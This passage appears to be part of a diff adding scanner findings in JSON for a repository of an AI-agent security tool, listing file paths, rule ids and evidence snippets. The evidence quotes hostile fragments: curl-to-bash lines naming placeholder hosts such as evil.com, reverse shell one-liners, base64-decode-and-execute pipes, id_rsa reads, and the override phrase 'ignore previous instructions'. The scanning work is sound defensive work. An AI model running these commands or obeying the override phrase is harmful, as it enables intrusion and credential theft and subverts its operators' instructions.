+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/python_backend/bartholomew_eval/bartholomew_eval/memory_curator.py",
+      "line": 36,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "94aa868ac1e3b451f9f07b16404c1b9bae01702404a8905b0bcbea7fd1f8f9a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/python_backend/bartholomew_eval/bartholomew_eval/async_dreamer.py",
+      "line": 50,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "765061518de3fcb43c38dede03da5e3406eddbd8a485b2fa6e8b0612bcb4bdbd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/python_backend/bartholomew_eval/bartholomew_eval/self_healing.py",
+      "line": 43,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "68128410ab4231625a7e2ab6d2ae27300e36bbe0f9f8c1c5ec8f1858369e527c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/python_backend/bartholomew_eval/async_dreamer.py",
+      "line": 50,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "765061518de3fcb43c38dede03da5e3406eddbd8a485b2fa6e8b0612bcb4bdbd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/python_backend/bartholomew_eval/self_healing.py",
+      "line": 43,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "68128410ab4231625a7e2ab6d2ae27300e36bbe0f9f8c1c5ec8f1858369e527c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/bartholomew_eval/fuzzer.py",
+      "line": 18,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "1fb7dac664e9a33b11f384bec002f8d3ac64987549d3da3a4dae4453c75296af"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/bartholomew_eval/threat_discovery.py",
+      "line": 26,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "ca19a40272b8cb83c535fee4fa5b73a9b56b985ce8f5c225724b06eedaf60ef3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/bartholomew_eval/memory_curator.py",
+      "line": 36,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "2a48fddbaf82cc99a0d88516ab1ec3e3e99301017cc53c810bd57c222f145b76"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/bartholomew_eval/async_dreamer.py",
+      "line": 50,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "765061518de3fcb43c38dede03da5e3406eddbd8a485b2fa6e8b0612bcb4bdbd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/bartholomew_eval/self_healing.py",
+      "line": 43,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "68128410ab4231625a7e2ab6d2ae27300e36bbe0f9f8c1c5ec8f1858369e527c"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0101",
+      "summary": "Reads credential files and sends data to a webhook / paste / tunnel endpoint",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/keystone_passkey.py",
+      "line": 25,
+      "evidence": "id_rsa",
+      "file_sha256": "748ef8865a88a47787d232961b8f0d397fdc535b20c31c90a959154e48a0e4f9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/keystone_passkey.py",
+      "line": 31,
+      "evidence": "curl | sh",
+      "file_sha256": "748ef8865a88a47787d232961b8f0d397fdc535b20c31c90a959154e48a0e4f9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/native_core/ast_scanner.py",
+      "line": 30,
+      "evidence": "curl | bash",
+      "file_sha256": "3f35ada486b794fa0c55af7a42537ef337951ec7ce924817327a3334dca19f97"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/universal_model_guard.py",
+      "line": 287,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "d3e735fdc6f8a9d32b0490c8f1920e0b54150a96e4764e6181f237570ea0afb5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/btp_guard/chaos_harness.py",
+      "line": 35,
+      "evidence": "curl -s http://malicious.evil/payload.sh | bash",
+      "file_sha256": "cab93b4625d9402403fe33fd2008d3b226b87d72bce1b78f62d97170de19de30"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/btp_guard/chaos_harness.py",
+      "line": 31,
+      "evidence": "base64 -d | bash",
+      "file_sha256": "cab93b4625d9402403fe33fd2008d3b226b87d72bce1b78f62d97170de19de30"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/btp_guard/chaos_harness.py",
+      "line": 32,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "cab93b4625d9402403fe33fd2008d3b226b87d72bce1b78f62d97170de19de30"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/btp_guard/cli.py",
+      "line": 747,
+      "evidence": "curl -s http://malicious.cc/rev.sh | bash",
+      "file_sha256": "fed7bf8ee8bae13d4332d90924b8b1d8b231ab4d8013bb101b6efe1a6fafaeb9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/btp_guard/trust_protocol.py",
+      "line": 56,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "1faba5150e7098ee06fa5fe611ce484828e055cf24c0d766d6c4a9f9024b09ed"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/btp_guard/project_immunizer.py",
+      "line": 38,
+      "evidence": "curl ... | bash",
+      "file_sha256": "c33c77bbc735962bae1f626350606f6a1216d4cb62ee13e53c0cdf7be5408870"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/btp_guard/ecosystem_advisor.py",
+      "line": 69,
+      "evidence": "curl | bash",
+      "file_sha256": "5402e7691f22de1ea2c4a5f51873eea4882059c14565537f33dfb8ab71b265b5"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/btp_guard/redteam.py",
+      "line": 35,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "a0012bc125b7bb09c312446abdea4be87ba96cabd3ed0d0c66e84614a4b00a1b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/btp_guard/auto_heal.py",
+      "line": 8,
+      "evidence": "curl | bash",
+      "file_sha256": "c8c587d197c49053ea1099038231488833ae86aa90e09f1558b599452d3ca4ea"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/btp_guard/universal_extension_mesh.py",
+      "line": 41,
+      "evidence": "curl | bash",
+      "file_sha256": "88c3723b595ff2c16ae8e9237c4666db28d3842c01647d7a2bed06315f298b65"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/btp_guard/subnet_validator.py",
+      "line": 87,
+      "evidence": "curl\" in lower and \"| sh",
+      "file_sha256": "ef170eba24d2e2ac46a9b3c7fc8d59018ab836c207c336f595a2c74dfa6767b0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/btp_guard/subnet_validator.py",
+      "line": 88,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "ef170eba24d2e2ac46a9b3c7fc8d59018ab836c207c336f595a2c74dfa6767b0"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0101",
+      "summary": "Reads credential files and sends data to a webhook / paste / tunnel endpoint",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/btp_guard/keystone_passkey.py",
+      "line": 25,
+      "evidence": "id_rsa",
+      "file_sha256": "748ef8865a88a47787d232961b8f0d397fdc535b20c31c90a959154e48a0e4f9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/btp_guard/keystone_passkey.py",
+      "line": 31,
+      "evidence": "curl | sh",
+      "file_sha256": "748ef8865a88a47787d232961b8f0d397fdc535b20c31c90a959154e48a0e4f9"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/deploy/cloudflare/worker.js",
+      "line": 74,
+      "evidence": "nc -e /bin/sh",
+      "file_sha256": "64c018ea994bc1d691de6a23e3853537dc64c894626b7f233d070401364821bf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/deploy/docker/Dockerfile.sandbox",
+      "line": 21,
+      "evidence": "curl -fsSL https://deb.nodesource.com/setup_20.x | bash",
+      "file_sha256": "c23e66016cb0f868f7bf7620a35ff1e2d138ffe732bb6a7364098942d63d864a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/deploy/gcp_staging/dashboard/dashboard/index.html",
+      "line": 717,
+      "evidence": "curl -sSL https://35-255-62-200.sslip.io/scripts/deploy-gateway1.sh | bash",
+      "file_sha256": "055735ebf1aea272d2077a5c80047664f408c7a347f6dc209b20a4a48f3ff0f1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/deploy/gcp_staging/dashboard/index.html",
+      "line": 717,
+      "evidence": "curl -sSL https://35-255-62-200.sslip.io/scripts/deploy-gateway1.sh | bash",
+      "file_sha256": "055735ebf1aea272d2077a5c80047664f408c7a347f6dc209b20a4a48f3ff0f1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/policies/autonomous_coding_agent.yaml",
+      "line": 36,
+      "evidence": "curl | bash",
+      "file_sha256": "eac230ffc3b20ca1d250109d7d40e650cb74c66f0b2ec1a2de8f541d65d7ce66"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/docs/ZERO_INSTALL_CLOUD_GATEWAY.md",
+      "line": 165,
+      "evidence": "base64 -d \\| sh",
+      "file_sha256": "49f08ace05b5654216591ff686d79fb9b318b2dd28694738dc91fe04beb9df87"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/docs/audit/btp-baseline.md",
+      "line": 60,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "05b73e91e28f9a589d6819d8192e20fbea3cde3e9689abc7c046493ebeeaa6af"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/docs/audit/stop-conditions-and-escalation.md",
+      "line": 24,
+      "evidence": "base64 -d | base64 -d | sh",
+      "file_sha256": "01460ec866fba154046c56f39d53f8d91f22033fb4ee205d323862faaf94aad6"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/docs/audit/execution-report.md",
+      "line": 24,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "c77fe7a3c867cf88bb66478d22a444334003f035d45b9b5d70cbe0d6dcf28c96"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/docs/audit/execution-boundary-challenge.md",
+      "line": 71,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "e6ed189ad3bcfb3d4f02e2a80640b07b453796e9c53c0b88cf6f533e8f2d6bc1"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/docs/audit/bypass-matrix.md",
+      "line": 21,
+      "evidence": "base64 -d \\| sh",
+      "file_sha256": "b70a97d2de101aa1476edf9a9071e9f48b2bf4703a2f2ddeaeee22a5897d7683"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/docs/integrations/BUILDFUL_INTEGRATION_GUIDE.md",
+      "line": 39,
+      "evidence": "curl | bash",
+      "file_sha256": "2892b2d6f9d19763ad966e81c4ec6593d05ecaefd67ff88430e96d85b9b08985"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/docs/zenodo_publication_btp_v5422.md",
+      "line": 109,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "baea33e08130603be2ec92812e80ab6c3d26538d384e04a26de370c39908ae00"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/docs/REPRODUCIBLE_DEMO.md",
+      "line": 56,
+      "evidence": "curl ... \\| bash",
+      "file_sha256": "34e6f244feeb6fa6e69366676eb2f0177f5e0eddb9b6e8eeb53c58be0614230f"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/docs/HUGGINGFACE_DATASET_CARD.md",
+      "line": 101,
+      "evidence": "nc -e /bin/sh",
+      "file_sha256": "c7b0cb06e04b6095c80265e2a44296ab415a112125c469779a07c80764af9dd2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/docs/CLAUDE_CODE_INTEGRATION_GUIDE.md",
+      "line": 14,
+      "evidence": "curl | sh",
+      "file_sha256": "dab03f8e5225eb3f12b2dc53671f725f962203be6c6ae99aaf51af2a39becb95"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/docs/assets/img/keystone_passkey_core.svg",
+      "line": 85,
+      "evidence": "curl | sh",
+      "file_sha256": "e6c7fe236f33632bad47597fe4cda471fdf1ec7ebd4d8710a14e062159aab918"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/docs/DISCORD_GITHUB_ACTION_TEMPLATES.md",
+      "line": 19,
+      "evidence": "curl | bash",
+      "file_sha256": "fd0a8bcb85ba21143e4119307db56438fc745c2124453c75c10b0e0251cfdefa"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/docs/CURSORRULES_DIRECTORY_SUBMISSION.md",
+      "line": 28,
+      "evidence": "curl | sh",
+      "file_sha256": "5af42dad12055988bd05547e5a0c399838a4750423c4e1599fb60ad62d3a615b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/docs/whitepaper.md",
+      "line": 34,
+      "evidence": "curl | sh",
+      "file_sha256": "481371a0d341f568214ea086a41ffb641402d7370cf630177c9ffb2c328508a7"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/docs/SECURE_DESIGN.md",
+      "line": 35,
+      "evidence": "base64 -d \\| sh",
+      "file_sha256": "8f8d194fe4a363ecdaa27df173d9d1c9fda2a4e691dcdff8720c9d3463dd22d4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/docs/technical-docs.md",
+      "line": 84,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "d2b362c111815c25e1b60ec35b89c74f80bc5f1dcade1580b12e01acdcf62496"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/docs/WINDSURF_RULES_SUBMISSION.md",
+      "line": 28,
+      "evidence": "curl | sh",
+      "file_sha256": "f1255018a59f879b1ccfb01aff7f1e8fc5c7b68a17b86d50320c0ff02de217c2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/scripts/run_ci_agent_audit.py",
+      "line": 8,
+      "evidence": "curl | bash",
+      "file_sha256": "6237cae24514eae89b9e2af03ef3eff90c20980cc2c42b1060475426b8929c05"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/scripts/install.sh",
+      "line": 3,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/bartholomew-ai/bartholomew/main/ins",
+      "file_sha256": "e9541cde4ebf33df3587d7144cb25dfcdffeebf786def4e19712ece524564970"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/scripts/generate_assessment_report.py",
+      "line": 128,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "d970bd148ce4ae154168c24abd7270524bb83b0c5f9cba574c6e4412ad52db84"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/scripts/reproducible_adversarial_suite.py",
+      "line": 96,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "49c49c22bd6c948250b72c3f95b8ec588c603c278a962aa000131e6a48bbb761"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/scripts/test_in_editor_voice_drive.py",
+      "line": 73,
+      "evidence": "os.system(f'\"{sys.executable}\" -c \"import sys; sys.path.insert(0, r\\'{TARGET_DIR",
+      "file_sha256": "ebdc9ac77deb0d5ac6a747e8b053256bf17379b4c0da1ac396d6dc289cf289b6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/scripts/autonomous_soc2_revenue_bot.py",
+      "line": 108,
+      "evidence": "curl | sh",
+      "file_sha256": "6001754958e07c5ad78e569caee6a4d1489ade61f712996da29e4bf68ef17fe5"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_agent_discovery_python.py",
+      "line": 151,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "3b18050df3bb9a6148ad197cb74ea72844b3cf387f6e46a08a62e064cfe8e533"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_agent_discovery_python.py",
+      "line": 86,
+      "evidence": "nc -e /bin/sh",
+      "file_sha256": "3b18050df3bb9a6148ad197cb74ea72844b3cf387f6e46a08a62e064cfe8e533"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_agent_core.py",
+      "line": 74,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "acf0fb2f51252cb966aa7c38f8ff7d88acb017369f2bcfe2658d8a89aba9a0ba"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_v25_kernel_benchmark.py",
+      "line": 122,
+      "evidence": "curl evil.com | sh",
+      "file_sha256": "95a2334b774af159cfccd3434068a18817443fcb2d64cef312a1d77a5f3eb46e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_polyglot_ast_validator.py",
+      "line": 73,
+      "evidence": "curl https://evil.com/payload.sh | bash",
+      "file_sha256": "35197892c1456062d534bbf8e016aa2ffedca1a2ad63628f2577eed3e1e4f334"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_adversarial_jailbreak_fuzzer.py",
+      "line": 37,
+      "evidence": "curl -s http://malicious.cc/rev.sh | bash",
+      "file_sha256": "7a957a4bcadaca2218e0d00083dcfaae8d45619f7fbc6dcbc910e6592db6dba9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_adversarial_jailbreak_fuzzer.py",
+      "line": 192,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "7a957a4bcadaca2218e0d00083dcfaae8d45619f7fbc6dcbc910e6592db6dba9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_universal_model_compatibility.py",
+      "line": 440,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "9738f4ebfff433a576852ec61175b626ef15a396b2d9f01d5f8780ac8e1cb0ba"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_internal_deep_evasion_lab.py",
+      "line": 61,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "8ef5f8222a7c6bc6f00349287df6d4aea6bd9d61737b5e9f4cc96ba61e6e676b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_nvidia_nim_integration.py",
+      "line": 50,
+      "evidence": "curl http://evil.com/leak | sh",
+      "file_sha256": "a35251cc8817a2917013d79aa887b8ddb824ea42c1dc08abfa7dceb9137bea8c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_v6_new_pillars.py",
+      "line": 19,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "8260b14c802d3280be0881014b54e30208e76b855bcf45a7a3e4b269d426d0e0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_shield_and_auto_heal.py",
+      "line": 13,
+      "evidence": "curl https://evil.com/x.sh | bash",
+      "file_sha256": "133af5bbd3007b76a72e9db87aa65bc4fbfb0c33f2072775d98f0be8f35f4202"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_llamacpp_guard.py",
+      "line": 41,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "0b206b804dd81b59ed3d517d3efb05d2e33d6aa1febc90aec1e3a42523202a16"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_all_framework_adapters.py",
+      "line": 69,
+      "evidence": "curl(\"curl -s http://evil.com | bash",
+      "file_sha256": "5fe3d983bb1b6af82202623b6bad54c5a3cde4075c41cfe5b75b9d67fb192f54"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_live_benchmark.py",
+      "line": 50,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "6e5bbd2fe7e27fc5690490ec75dcf1984a178a50f10e51d2cfb36b70ec31d12a"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_v52_auto_immunity_engine.py",
+      "line": 94,
+      "evidence": "base64 -d | sh",
